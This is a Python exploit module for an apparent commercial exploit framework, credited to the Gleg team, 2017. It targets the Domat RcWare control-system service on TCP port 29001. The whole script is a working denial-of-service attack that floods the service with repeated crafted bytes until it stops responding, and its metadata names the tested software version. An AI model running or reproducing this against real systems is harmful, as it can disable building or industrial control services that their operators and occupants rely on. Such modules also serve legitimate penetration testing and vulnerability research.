#!/usr/bin/env python

import socket
from collections import OrderedDict

from Sploit import Sploit
from shellcodes.PhpShellcode import PhpShellcodes

INFO = {}
INFO['NAME'] = "efs_rcware_dos"
INFO['DESCRIPTION'] = "Domat Control System RcWare DoS"
INFO['VENDOR'] = "https://domat-int.com/en/"
INFO["CVE Name"] = ""
INFO["DOWNLOAD_LINK"] = "https://domat-int.com/en/downloads/software/softplc-ide"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "23 Nov, 2017. Written by Gleg team."
INFO['PATH'] = "Dos/"
INFO["NOTES"] = """
    Specially crafted TCP package cause DoS. 
Checked against RcWare 1.6.2016 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 29001


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to %s:%s" % (self.host, self.port))
        s=socket.socket()
        s.connect((self.host, self.port))
        s.settimeout(5)
        for i in range(200):
            try:
                s.send('\xff\xaa' * 10000)
            except socket.timeout:
                self.log('[+] RcWare svc not responds')
                self.finish(True)
        self.log("[-] Can't do DoS")
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
